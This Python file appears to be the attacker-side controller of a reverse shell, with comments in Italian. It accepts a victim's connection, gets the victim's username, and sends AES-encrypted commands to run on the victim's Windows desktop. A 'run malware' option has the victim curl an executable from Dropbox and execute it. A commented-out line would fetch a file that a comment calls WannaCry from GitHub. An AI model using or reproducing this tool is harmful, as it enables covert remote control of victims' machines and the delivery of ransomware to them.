import socket
import os
from Crypto.Cipher import AES

key = b's1cur3zz4pr1v4cy' # chiave crittografica

#algoritmi per crittografare e decrittografare i messaggi

def encrypt_msg(msg):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext = cipher.encrypt(msg.encode())
    c_msg = []
    c_msg.append(ciphertext)
    c_msg.append(nonce)
    return str(c_msg).encode('utf-8')
    
def decrypt_msg(msg):
    msg_pack = eval(msg.decode('utf-8'))
    nonce = msg_pack[1]
    cipher = AES.new(key, AES.MODE_EAX, nonce)    
    d_msg = cipher.decrypt(msg_pack[0])
    return d_msg.decode()
    
SERVER_HOST = '192.168.1.53' # indirizzo IP del server 
SERVER_PORT = 5555 # porta usata per la comunicazione con la reverse shell
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
# creo il socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
# mi connetto al client e ricevo il nome utente della vittima
username = decrypt_msg(client_socket.recv(BUFFER_SIZE))
# la shell viene aperta sul desktop della vittima
cwd = f"C:\\Users\{username}\Desktop"

while True:
    # ricevo il comando
    command = input(f"{cwd} ☠> ")
    if not command.strip():
        # se è vuoto lo richiedo
        continue
    # invio il comando al client crittografandolo con AES
    client_socket.send(encrypt_msg(command))
    if command.lower() == "exit":
        # spengo il server se il comando è exit
        break
    if command.lower() == "run malware": # scarico il malware e lo eseguo solo se lo chiede l'attaccante
        # download wannacry ??? not the best idea
        # client_socket.send(encrypt_msg(f'curl -L https://github.com/FrancescoCecconello/temp/raw/main/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe --output C:\\Users\{username}\Desktop\malware.exe' ))
        client_socket.send(encrypt_msg(f'curl -L https://www.dropbox.com/s/sn9ofibuw7kqag9/malware.exe --output C:\\Users\{username}\Desktop\malware.exe' ))
        client_socket.recv(BUFFER_SIZE)
        client_socket.send(encrypt_msg(f'C:\\Users\{username}\Desktop\malware.exe' ))
        client_socket.recv(BUFFER_SIZE)
    # altrimenti continuo ad usare la shell
    output = decrypt_msg(client_socket.recv(BUFFER_SIZE))
    try:
        results, cwd = output.split(SEPARATOR)
    except Exception as e:
        results = output
    print(results)

